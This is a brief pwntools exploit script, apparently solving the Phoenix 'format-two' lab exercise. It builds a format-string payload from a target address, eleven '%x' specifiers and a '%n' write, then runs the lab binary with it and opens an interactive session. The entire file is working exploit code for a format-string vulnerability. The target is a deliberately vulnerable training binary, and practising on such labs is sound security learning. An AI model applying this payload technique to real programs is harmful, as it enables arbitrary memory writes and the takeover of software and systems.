# correct (2023-12-05)
from pwn import *

context.log_level = "debug"

payload = b""
payload += b"\x68\x98\x04\x08"
payload += b"%x" * 11
payload += b"%n"

p = process(["/opt/phoenix/i486/format-two", payload])

# pause()
p.interactive()